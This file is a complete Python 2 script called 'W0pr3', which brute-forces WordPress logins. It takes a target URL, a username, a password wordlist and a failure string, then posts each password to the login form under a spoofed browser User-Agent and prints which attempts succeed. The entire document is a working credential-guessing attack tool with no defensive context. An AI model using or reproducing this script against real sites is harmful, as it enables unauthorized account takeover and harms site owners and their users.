#!/usr/bin/python
# W0pr3 - Wordpress BruteForce
# Coded By Afrizal F.A - ICWR-TECH
# Write in Python

import re, sys, requests

print """
#####################################
# __        _____            _____  #
# \ \      / / _ \ _ __  _ _|___ /  #
#  \ \ /\ / / | | | '_ \| '__||_ \  #
#   \ V  V /| |_| | |_) | |  ___) | #
#    \_/\_/  \___/| .__/|_| |____/  #
#                 |_|               #
#                                   #
# W0pr3 - Wordpress BruteForce      #
# Coded By Afrizal F.A - ICWR-TECH  #
#                                   #
#####################################
"""

buka_list = open(sys.argv[3], "r")
raw_list = buka_list.read()
list_passwd = raw_list.split("\n")

print "[+] Bruteforcing : " + sys.argv[1] + "\n"

for passwd in list_passwd :
    if not passwd :
        continue

    data_coba = { "loginform" : "loginform", "log" : sys.argv[2], "pwd" : passwd, "rememberme" : "forever", "wp-submit" : "Log In", "redirect_to" : sys.argv[1], "testcookie" : "1" }
    r = requests.post(url=sys.argv[1], data=data_coba, headers={"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36", 'Cookie':'wordpress_test_cookie=WP Cookie check'}, allow_redirects=True)
    respon = r.content

    if re.search(sys.argv[4] ,respon) :

        print "[-] Username : " + sys.argv[2] + " | Passowrd : " + passwd + " ( Failed )"

    else :

        print "[+] Username : " + sys.argv[2] + " | Passowrd : " + passwd + " ( Success )"
        if raw_input("[?] Type 'exit' To Exit, Enter To Next : ") == "exit" :
            exit()

buka_list.close()
